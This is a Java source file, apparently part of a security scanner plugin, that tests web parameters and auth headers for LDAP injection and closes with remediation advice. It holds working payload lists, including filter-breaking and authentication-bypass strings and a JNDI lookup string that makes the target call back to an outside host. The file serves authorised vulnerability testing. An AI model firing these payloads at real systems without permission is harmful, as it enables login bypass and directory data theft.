package com.burpmax.active;

import java.util.*;
import java.util.regex.*;
import static com.burpmax.model.Finding.*;

/**
 * LDAP injection probe — two detection strategies:
 *
 * 1. In-band (error-based):
 *    Inject syntax-breaking characters and check for LDAP error messages in
 *    the response. Common in login forms, directory search, and user lookup
 *    endpoints that query Active Directory or OpenLDAP.
 *
 *    Payloads target:
 *      - Filter injection:  )(uid=*))(|(uid=*
 *      - Auth bypass:       admin)(&(password=*)
 *      - Wildcard:          *)(|(cn=*
 *
 * 2. OOB (blind):
 *    Inject LDAP referral payloads that, if the server follows referrals,
 *    trigger an outbound LDAP or DNS lookup to the OOB host.
 *    Also injects JNDI-style payloads since some LDAP clients evaluate
 *    attribute values containing ldap:// or jndi: URIs.
 *
 *    OOB payloads:
 *      - LDAP referral:  *)(|(objectclass=*))%00  with Referer: ldap://HOST
 *      - JNDI lookup:    ${jndi:ldap://HOST/ldap}  (same as Log4Shell but in LDAP context)
 *      - Direct URL:     ldap://HOST/dc=example,dc=com
 */
public class LdapInjectionProbe {

    // ── In-band payloads ──────────────────────────────────────────────────────
    private static final List<String> INJECTION_PAYLOADS = List.of(
        "*",
        "*)(",
        "*)(uid=*))(|(uid=*",
        "admin)(&",
        ")(|(cn=*",
        "*))%00",
        "\\2a",                 // URL-encoded * - tests server-side decoding before LDAP query
        "admin)(!(&(1=0"
    );

    // LDAP error patterns across major directory servers
    private static final List<Pattern> LDAP_ERROR_PATTERNS = List.of(
        Pattern.compile("ldap.*error",                                Pattern.CASE_INSENSITIVE),
        Pattern.compile("invalid.*filter",                           Pattern.CASE_INSENSITIVE),
        Pattern.compile("javax\\.naming",                            Pattern.CASE_INSENSITIVE),
        Pattern.compile("org\\.springframework\\.ldap",              Pattern.CASE_INSENSITIVE),
        Pattern.compile("com\\.sun\\.jndi\\.ldap",                   Pattern.CASE_INSENSITIVE),
        Pattern.compile("NamingException",                           Pattern.CASE_INSENSITIVE),
        Pattern.compile("LDAPException",                             Pattern.CASE_INSENSITIVE),
        Pattern.compile("size limit exceeded",                       Pattern.CASE_INSENSITIVE),
        Pattern.compile("error.*0x[0-9a-f]{2}",                     Pattern.CASE_INSENSITIVE),
        Pattern.compile("active directory",                          Pattern.CASE_INSENSITIVE),
        Pattern.compile("distinguishedName|objectClass|sAMAccountName", Pattern.CASE_INSENSITIVE)
    );

    // ── OOB payloads ──────────────────────────────────────────────────────────
    // These inject LDAP URL or JNDI references that trigger outbound callbacks
    private static final List<String> OOB_PAYLOAD_TEMPLATES = List.of(
        "ldap://HOST/dc=burpmax,dc=test",
        "*)(|(objectclass=*))(o=ldap://HOST/",
        "${jndi:ldap://HOST/ldap-inject}"
    );

    private static final List<String> INJECTABLE_HEADERS = List.of(
        "Authorization", "X-Username", "X-User", "X-Auth-User"
    );

    // ── Main entry point ──────────────────────────────────────────────────────
    public static List<ActiveScanResult> probe(ProbeContext ctx,
                                               RequestBuilder rb,
                                               HttpSender sender,
                                               OobClient oob) {
        List<ActiveScanResult> results = new ArrayList<>();
        Set<String> fired = new HashSet<>();

        // ── 1. In-band error-based ────────────────────────────────────────
        for (String param : ctx.allParamNames()) {
            if (fired.contains(param)) continue;
            ActiveScanResult r = probeInband(ctx, rb, sender, param, null);
            if (r != null) { results.add(r); fired.add(param); }
        }
        for (String header : INJECTABLE_HEADERS) {
            String key = "hdr:" + header;
            if (fired.contains(key)) continue;
            ActiveScanResult r = probeInband(ctx, rb, sender, null, header);
            if (r != null) { results.add(r); fired.add(key); }
        }

        // ── 2. OOB blind ──────────────────────────────────────────────────
        if (oob != null && oob.isAvailable()) {
            for (String param : ctx.allParamNames()) {
                if (fired.contains(param)) continue;
                String oobHost = oob.generateHost("ldap-" + param);
                if (oobHost == null) continue;
                for (String template : OOB_PAYLOAD_TEMPLATES) {
                    String payload = template.replace("HOST", oobHost);
                    byte[] req = rb.buildProbeRequest(ctx, param, payload);
                    if (req != null) {
                        // Record before sending — callback must match even if response is null.
                        oob.recordInjection(oobHost, "LDAP Injection (Blind OOB)",
                                ctx.url, param, payload);
                        sender.send(ctx.service, req);  // fire-and-forget
                    }
                }
            }
        }

        return results;
    }

    // ── In-band detection ─────────────────────────────────────────────────────
    private static ActiveScanResult probeInband(ProbeContext ctx, RequestBuilder rb,
                                                 HttpSender sender,
                                                 String param, String header) {
        // Fetch baseline
        HttpSender.Response baseline = sender.send(ctx.service, ctx.originalRequest);
        String baseText = baseline != null ? baseline.body() + " " + baseline.headers() : "";

        for (String payload : INJECTION_PAYLOADS) {
            byte[] req = param != null
                    ? rb.buildProbeRequest(ctx, param, payload)
                    : rb.injectHeader(ctx.originalRequest, header, payload);
            if (req == null) continue;

            HttpSender.Response resp = sender.send(ctx.service, req);
            if (resp == null) continue;
            String respText = resp.body() + " " + resp.headers();

            for (Pattern pat : LDAP_ERROR_PATTERNS) {
                if (pat.matcher(respText).find() && !pat.matcher(baseText).find()) {
                    // Confirm it's reproducible
                    HttpSender.Response confirm = sender.send(ctx.service, req);
                    if (confirm == null) continue;
                    if (!pat.matcher(confirm.body() + " " + confirm.headers()).find()) continue;

                    String where = param != null ? "parameter '" + param + "'" : "header '" + header + "'";
                    return new ActiveScanResult(
                        "LDAP Injection (Error-Based)", SEV_HIGH,
                        "LDAP injection was detected on " + where + ". The payload '" + payload +
                        "' caused an LDAP error to appear in the response that was absent from " +
                        "the clean baseline, suggesting user input is interpolated into an LDAP " +
                        "filter or DN without sanitisation. An attacker can manipulate LDAP queries " +
                        "to bypass authentication, enumerate directory entries, or extract sensitive " +
                        "attributes (passwords, group memberships, email addresses).",
                        "Injection point: " + where + " | Payload: " + payload +
                        " | LDAP error pattern: " + pat.pattern(),
                        LDAP_REMEDIATION, "CWE-90",
                        ctx.url, param != null ? param : header, payload,
                        trunc(new String(req), 300), trunc(respText, 200),
                    req, resp.raw(), -1L);
                }
            }
        }
        return null;
    }

    // ── Finding builder for OOB hits ─────────────────────────────────────────
    public static ActiveScanResult buildFinding(OobClient.OobHit hit) {
        return new ActiveScanResult(
            "LDAP Injection (Blind OOB)", SEV_HIGH,
            "Blind LDAP injection was confirmed via an out-of-band " + hit.interactionType() +
            " callback. The payload injected into '" + hit.parameter() +
            "' caused the server to initiate an outbound LDAP or DNS connection to the OOB host " +
            "(" + hit.interactionDetail() + "). This confirms that user input is being " +
            "processed as part of an LDAP query or JNDI lookup, enabling authentication bypass, " +
            "directory enumeration, and potential credential extraction from the directory service.",
            "OOB callback: " + hit.interactionDetail() +
            " | Parameter: " + hit.parameter() +
            " | Payload: " + trunc(hit.payload(), 100),
            LDAP_REMEDIATION, "CWE-90",
            hit.endpoint(), hit.parameter(), hit.payload(), "", hit.interactionDetail());
    }

    private static String trunc(String s, int n) {
        return s == null ? "" : s.length() > n ? s.substring(0, n) + "..." : s;
    }

    private static final String LDAP_REMEDIATION =
        "PRIMARY FIX - LDAP Filter Encoding:\n" +
        "Escape all user-supplied values before inserting them into LDAP filter strings.\n" +
        "Special characters that must be escaped: * ( ) \\ NUL and / in DN components.\n" +
        "  Java:   org.springframework.ldap.core.LdapEncoder.filterEncode(userInput)\n" +
        "  Python: ldap3 library uses parameterised filter construction automatically\n" +
        "  .NET:   System.DirectoryServices.Protocols with explicit filter escaping\n" +
        "  PHP:    ldap_escape($userInput, \"\", LDAP_ESCAPE_FILTER)\n\n" +
        "SECONDARY CONTROLS:\n" +
        "- Disable referral following: env.put(Context.REFERRAL, \"ignore\"). LDAP referrals\n" +
        "  can be used to redirect queries to attacker-controlled LDAP servers.\n" +
        "- Least privilege: the application LDAP service account should only have read access\n" +
        "  to the specific OUs it needs - never use an LDAP admin or directory admin account.\n" +
        "- Input validation: restrict usernames and search terms to expected character sets\n" +
        "  ([a-zA-Z0-9@._-]) before they reach the LDAP layer.\n" +
        "- Logging: log all LDAP queries and alert on unusual filter patterns or error rates.";
}
